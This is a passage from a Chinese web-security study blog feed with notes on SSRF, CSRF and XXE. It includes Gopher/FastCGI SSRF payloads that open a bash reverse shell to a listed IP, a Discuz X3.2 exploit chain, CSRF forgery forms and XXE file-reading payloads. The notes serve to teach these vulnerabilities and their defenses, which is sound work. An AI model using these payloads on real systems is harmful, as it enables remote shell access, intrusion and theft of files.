class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;exp.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: curl&#x2F;7.43.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Content-Length: 49</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">e&#x3D;bash -i &gt;%26 &#x2F;dev&#x2F;tcp&#x2F;172.19.23.228&#x2F;2333 0&gt;%261</span><br></pre></td></tr></table></figure><p>构造 Gopher 协议的 URL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST &#x2F;exp.php HTTP&#x2F;1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: curl&#x2F;7.43.0%0d%0aAccept: *&#x2F;*%0d%0aContent-Length: 49%0d%0aContent-Type: application&#x2F;x-www-form-urlencoded%0d%0a%0d%0ae&#x3D;bash -i &gt;%2526 &#x2F;dev&#x2F;tcp&#x2F;172.19.23.228&#x2F;2333 0&gt;%25261null</span><br></pre></td></tr></table></figure><p>攻击：</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801231053626.png" alt="image-20200801231053626"></p><h4 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h4><p>【利用 Discuz SSRF 攻击 FastCGI】</p><p>Discuz X3.2 存在 SSRF 漏洞，当服务器开启了 Gopher wrapper 时，可以进行一系列的攻击。<br>首先根据 phpinfo 确定开启了 Gopher wrapper，且确定 Web 目录、PHP 运行方式为 FastCGI。</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801231234945.png" alt="image-20200801231234945"></p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801231301811.png" alt="image-20200801231301811"></p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801231326020.png" alt="image-20200801231326020"></p><p>测试 Gopher 协议是否可用，请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8899&#x2F;forum.php?mod&#x3D;ajax&amp;action&#x3D;downremoteimg&amp;message&#x3D;%5Bimg%3D1%2C1%5Dhttp%3A%2f%2f127.0.0.1%3A9999%2fgopher.php%3Fa.jpg%5B%2fimg%5D</span><br></pre></td></tr></table></figure><p>其中 gopher.php 内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location: gopher:&#x2F;&#x2F;127.0.0.1:2333&#x2F;_test&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>监听 2333 端口，访问上述 URL 即可验证：</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801231437085.png" alt="image-20200801231437085"></p><p>构造 FastCGI 的 Exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location: gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%13SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php%0D%01DOCUMENT_ROOT&#x2F;%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8899&#x2F;forum.php?mod&#x3D;ajax&amp;action&#x3D;downremoteimg&amp;message&#x3D;%5Bimg%3D1%2C1%5Dhttp%3A%2f%2f127.0.0.1%3A9999%2f1.php%3Fa.jpg%5B%2fimg%5D</span><br></pre></td></tr></table></figure><p>即可在 2333 端口上收到反弹的 shell：</p><p><img src="/2020/08/01/SSRF%E6%BC%8F%E6%B4%9E/image-20200801231558705.png" alt="image-20200801231558705"></p><h4 id="系统局限性"><a href="#系统局限性" class="headerlink" title="系统局限性"></a>系统局限性</h4><p>1、大部分 PHP 并不会开启 fopen 的 gopher wrapper<br>2、file_get_contents 的 gopher 协议不能 URLencode<br>3、file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败<br>4、PHP 的 curl 默认不 follow 302 跳转<br>5、curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SSRF" scheme="http://yoursite.com/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>CSRF漏洞</title>
    <link href="http://yoursite.com/2020/08/01/CSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/08/01/CSRF漏洞/</id>
    <published>2020-08-01T10:39:35.000Z</published>
    <updated>2020-08-01T11:08:19.375Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.CSRF漏洞</span><br><span class="line">CSRF：跨站请求伪造漏洞，通常缩写为CSRF或XSRF</span><br><span class="line">XSS与CSRF区别：</span><br><span class="line">XSS利用站点内的信任客户，盗取Cookie</span><br><span class="line">CSRF通过伪造成受信任用户请求受信任的网站</span><br><span class="line"></span><br><span class="line">2.CSRF漏洞原理</span><br><span class="line">利用目标用户的合法身份，以目标用户的名义执行某些非法操作。</span><br><span class="line">CSRF成功利用的条件：</span><br><span class="line">(1)用户已经登录系统</span><br><span class="line">(2)用户访问对应URL</span><br></pre></td></tr></table></figure><h2 id="无防护CSRF利用"><a href="#无防护CSRF利用" class="headerlink" title="无防护CSRF利用"></a>无防护CSRF利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1.GET型CSRF</span><br><span class="line">构造GET型URL，提交username和passwd参数，以此来新建对应的用户名和密码。</span><br><span class="line">例如：</span><br><span class="line">xxx.xxx.com&#x2F;new_user.php?username&#x3D;admin11&amp;passwd&#x3D;123456</span><br><span class="line"></span><br><span class="line">隐蔽利用：img标签的src属性来包含修改的内容</span><br><span class="line">例子：</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;xxx.xxx.com&#x2F;new_user.php?username&#x3D;admin11&amp;passwd&#x3D;123456&quot;&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">2.POST型CSRF</span><br><span class="line">与GET型的区别在于提交数据的位置在form表单中。</span><br><span class="line">设置表单用于提交。如&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;111&quot;&#x2F;&gt;</span><br><span class="line">paylaod:</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;xxx.xxx.com&#x2F;new_user.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;admintest&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;passwd&quot; value&#x3D;&quot;admintest&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;sub&quot; value&#x3D;&quot;ok&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h2 id="CSRF漏洞探测"><a href="#CSRF漏洞探测" class="headerlink" title="CSRF漏洞探测"></a>CSRF漏洞探测</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.手工探测</span><br><span class="line">手动探测原理在于探测web应用程序是否具有防止CSRF的措施：</span><br><span class="line">HTTP referer头</span><br><span class="line">是否设置token</span><br><span class="line">HTTP自定义头</span><br><span class="line"></span><br><span class="line">2.使用工具探测</span><br><span class="line">CSRFtester是一款CSRF漏洞的测试工具。</span><br><span class="line">测试原理：</span><br><span class="line">使用代理抓取我们在浏览器中访问过的所有连接以及所有的表单等信息，通过在CSRFtester中修改相应的表单等信息，重新提交，相当于一次伪造客户端请求。如果请求成功被网站服务器接受，则说明存在CSRF漏洞。</span><br><span class="line"></span><br><span class="line">使用：</span><br><span class="line">(1)设置浏览器代理</span><br><span class="line">(2)登录web应用程序，提交表单，在CSRF工具中修改表单内容，查看是否更改，如果更改表单则存在CSRF漏洞</span><br><span class="line">(3)编写POC代码</span><br></pre></td></tr></table></figure><h2 id="CSRF漏洞-token防御请求"><a href="#CSRF漏洞-token防御请求" class="headerlink" title="CSRF漏洞 token防御请求"></a>CSRF漏洞 token防御请求</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1.漏洞修复逻辑</span><br><span class="line">CSRF漏洞实质：服务器无法判断当前是否是合法用户的自定义操作。</span><br><span class="line"></span><br><span class="line">在用户登录之后给予用户一个唯一合法令牌，每一次操作过程，服务器都会验证令牌是否正确，如果正确执行操作，不正确不执行操作。</span><br><span class="line">一般情况下，给予的令牌会写入表单中隐藏域的value值中，随表单一起提交。</span><br><span class="line"></span><br><span class="line">2.生成token分析</span><br><span class="line">token作为识别操作是否是当前用户自己操作的唯一凭证，需要设置为复杂难以破解的内容。</span><br><span class="line">每秒发生变化的token示例：</span><br><span class="line">&lt;?php</span><br><span class="line">function token_generate()&#123;</span><br><span class="line">$salt&#x3D;&quot;hello&quot;.date(&quot;h:i:s&quot;);</span><br><span class="line">$token&#x3D;md5($salt);</span><br><span class="line">&#125;</span><br><span class="line">$token token_generate();</span><br><span class="line">echo $token;</span><br><span class="line"></span><br><span class="line">3.使用CSRF进行CSRF防御</span><br><span class="line">(1)登录验证成功之后，在会话session[&quot;user_token&quot;]中保存token</span><br><span class="line">(2)在后台操作中，增删改表单中添加隐藏域hidden，设置value为token</span><br><span class="line">(3)提交之后进行验证token是否正确</span><br></pre></td></tr></table></figure><h2 id="CSRF绕过referer"><a href="#CSRF绕过referer" class="headerlink" title="CSRF绕过referer"></a>CSRF绕过referer</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.Referer防御CSRF原理</span><br><span class="line">HTTP referer是header的一部分，当浏览器向web服务器发送请求的时候，一般带上referer，告诉服务器从哪个页面链接过来的。</span><br><span class="line"></span><br><span class="line">Referer防御代码：</span><br><span class="line">在PHP中使用$_SERVER[&#39;HTTP_REFERER&#39;]获取页面提交请求中的referer值。</span><br><span class="line"></span><br><span class="line">2.绕过referer技巧</span><br><span class="line">如果服务端只判断当前的referer中是否具有域名，则可以直接新建名称为验证域名的文件夹进行绕过，把payload放到该文件夹中。</span><br></pre></td></tr></table></figure><h2 id="GET型CSRF利用"><a href="#GET型CSRF利用" class="headerlink" title="GET型CSRF利用"></a>GET型CSRF利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1.链接利用</span><br><span class="line">在html中，a标签代表链接，可以跳转到其他位置。</span><br><span class="line">需要发送对应的请求到链接指向的位置，然后返回响应。</span><br><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;请求的地址，会被HTTP请求到的未知地址，可以携带GET型参数&quot;&gt;内容&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">2.iframe利用</span><br><span class="line">iframe标签内容将在页面加载过程中自动进行加载，src&#39;指向的位置就是页面请求的位置。</span><br><span class="line">可以设置iframe的style为display:none，以此来不显示iframe加载的内容。</span><br><span class="line"></span><br><span class="line">&lt;iframe src&#x3D;&quot;xxx&quot; style&#x3D;&quot;display:none&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">3.img标签利用</span><br><span class="line">img标签的内容会随着页面加载而被请求，以此是src指向的位置会在页面加载过程中进行请求。</span><br><span class="line">&lt;img src&#x3D;&quot;xxx&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">3.CSS-backgroud利用</span><br><span class="line">可以利用CSS中的background样式中的url来加载远程机器上的内容，从而对url中的内容发送http请求。</span><br></pre></td></tr></table></figure><h2 id="CSRF漏洞防御"><a href="#CSRF漏洞防御" class="headerlink" title="CSRF漏洞防御"></a>CSRF漏洞防御</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.验证码</span><br><span class="line">验证码防御被认为是对抗CSRF最为简单有效的方法。</span><br><span class="line">CSRF在用户不知情的情况下完成对应的操作，而验证码强制用户与应用程序交互，才能完成最终操作，可有效防御CSRF。</span><br><span class="line">出于用户体验考虑，不会每一个操作都加入验证码，验证码只能作为辅助手段，不能作为主要的解决方案。</span><br><span class="line"></span><br><span class="line">2.referer check</span><br><span class="line">Referer check主要用于防止盗链，同理也可以用来检查请求是否来自合法的&quot;源&quot;。</span><br><span class="line">缺陷：服务器并非任何时候都可以取到referer。例如HTTPS跳转到HTTP。</span><br><span class="line"></span><br><span class="line">3.Anti CSRF Token</span><br><span class="line">CSRF本质原因：重要操作的所有参数都是被恶意攻击者猜测到的。</span><br><span class="line">防御措施就是生成一个随机且不被随机猜测的参数，目前大多数防御采用token(不可猜测)</span><br><span class="line"></span><br><span class="line">4.Token泄露</span><br><span class="line">GET型token泄露：</span><br><span class="line">页面中包含&lt;img src&#x3D;&quot;xxx.com&quot;&#x2F;&gt;那么请求中的referer就会携带对应的GET Token</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CSRF" scheme="http://yoursite.com/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞</title>
    <link href="http://yoursite.com/2020/08/01/XXE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/08/01/XXE漏洞/</id>
    <published>2020-08-01T10:15:54.000Z</published>
    <updated>2020-08-01T10:19:18.000Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">1.XML</span><br><span class="line">XML被设计用来传输和存储数据。XML文档形成了一种树结构，从‘根部’开始，然后扩展到‘枝叶’。</span><br><span class="line">XML允许创作者定义自己的标签和自己的文档结构。</span><br><span class="line"></span><br><span class="line">XML示例：</span><br><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39; encoding&#x3D;&#39;UTF-8&#39;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;love&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;jan&lt;&#x2F;from&gt;</span><br><span class="line">&lt;heading&gt;reminder&lt;&#x2F;heading&gt;</span><br><span class="line">&lt;body&gt;don&#39;t&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br><span class="line"></span><br><span class="line">2.XML语法规则</span><br><span class="line">所有的xml元素都必须有一个关闭标签</span><br><span class="line">XML标签对大小写敏感</span><br><span class="line">XML必须正确嵌套</span><br><span class="line">XML属性值必须加引号</span><br><span class="line">实体引用</span><br><span class="line">在XML中，空格被保留</span><br><span class="line"></span><br><span class="line">3.XML元素介绍</span><br><span class="line">XML元素指的是从（且包括）开始标签直到（且包括）结束标签的部分。</span><br><span class="line">每个元素又可以有对应的属性。XML属性必须加引号</span><br><span class="line"></span><br><span class="line">4.XML DTD</span><br><span class="line">拥有正确语法的XML被称为‘形式良好’的XML。通过DTD验证的XML是’合法‘的XML。</span><br><span class="line">&lt;!DOCTYPE note</span><br><span class="line">[</span><br><span class="line">&lt;!ELEMENT note(to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading(#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body(#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1.DTD声明类型</span><br><span class="line">内部的DOCTYPE声明：&lt;!DOCTYPE root-element [element-declartions]&gt;</span><br><span class="line"></span><br><span class="line">外部文档声明：加入DTD位于XML源文件的外部，那么它应通过被封装在一个DOCTYPE定义中：</span><br><span class="line">&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</span><br><span class="line"></span><br><span class="line">2.DTD数据类型</span><br><span class="line">PCDATA 的意思是被解析的字符数据.PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</span><br><span class="line"></span><br><span class="line">CDATA 的意思是字符数据。</span><br><span class="line">CDATA是不会被解析器解析的文本。这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</span><br><span class="line"></span><br><span class="line">3.DTD实体介绍</span><br><span class="line">实体是定义引用普通文本或特殊字符的快捷方式的变量。</span><br><span class="line">内部实体：&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</span><br><span class="line">外部实体：&lt;!ENTITY entity-name SYSTEM &quot;URI&#x2F;URL&quot;</span><br><span class="line"></span><br><span class="line">4.XML注入产生原理</span><br><span class="line">XXE漏洞全称是XML External Entity Injection即xml外部实体注入漏洞。</span><br><span class="line">XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。</span><br><span class="line"></span><br><span class="line">XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</span><br></pre></td></tr></table></figure><h2 id="XXE漏洞代码简单编写"><a href="#XXE漏洞代码简单编写" class="headerlink" title="XXE漏洞代码简单编写"></a>XXE漏洞代码简单编写</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1.file_get_content函数</span><br><span class="line">file_get_contents()函数把整个文件读入到一个字符串中。</span><br><span class="line">参数path是必需，规定要读取的文件。</span><br><span class="line"></span><br><span class="line">2.php:&#x2F;&#x2F;input函数</span><br><span class="line">php:&#x2F;&#x2F;input是一个可以访问请求的原始数据的只读流。</span><br><span class="line">结合file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;)可以读取POST提交的数据。</span><br><span class="line">&lt;?php</span><br><span class="line">$str &#x3D;file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);</span><br><span class="line">echo $str;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">3.simplexml_load_string函数</span><br><span class="line">php中的simplexml_load_string函数将xml格式字符串转换为相应的simpleXMLElement。</span><br><span class="line"></span><br><span class="line">4.XML注入回显</span><br><span class="line">在PHP中可以使用print_r()、echo输出想要输出的内容。</span><br><span class="line">示例完整存在XXE漏洞代码：</span><br><span class="line">&lt;?php</span><br><span class="line">$xml&#x3D;file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);</span><br><span class="line">$data&#x3D;simplexml_load_string($xml);</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">print_r($data); &#x2F;&#x2F;注释掉该语句即为无回显的情况</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">读取本地文件payload：</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0 encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe[</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><h2 id="XXE利用-任意文件读取"><a href="#XXE利用-任意文件读取" class="headerlink" title="XXE利用-任意文件读取"></a>XXE利用-任意文件读取</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1.XXE漏洞代码</span><br><span class="line">&lt;?php</span><br><span class="line">$xml&#x3D;file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);</span><br><span class="line">$data&#x3D;simplexml_load_string($xml);</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">print_r($data); &#x2F;&#x2F;注释掉该语句即为无回显的情况</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">2.PHP中POC</span><br><span class="line">file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file.txt</span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;file&#x2F;txt</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encoder&#x2F;resource&#x3D;conf.php</span><br><span class="line"></span><br><span class="line">3.读取本地txt</span><br><span class="line">payload：</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;test&#x2F;flag.txt&quot;&gt;]&gt;</span><br><span class="line">&lt;value&gt; &amp;xxe &lt;&#x2F;value&gt;</span><br><span class="line">通过Burpsuite截断HTTP请求，改为POST方法，将payload放在post的内容页面中，空行。</span><br><span class="line"></span><br><span class="line">4.读取PHP文件</span><br><span class="line">直接利用file协议读取PHP文件会出现错误，则需要使用base64编码来进行读取。</span><br><span class="line">将SYSTEM后的替换为SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encoder&#x2F;resource&#x3D;test.php&quot; 即可</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="XXE" scheme="http://yoursite.com/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>PTE理论2</title>
    <link href="http://yoursite.com/2020/07/27/PTE%E7%90%86%E8%AE%BA2/"/>
    <id>http://yoursite.com/2020/07/27/PTE理论2/</id>
    <published>2020-07-27T03:20:48.000Z</published>
    <updated>2020-08-02T09:31:13.956Z</updated>
    
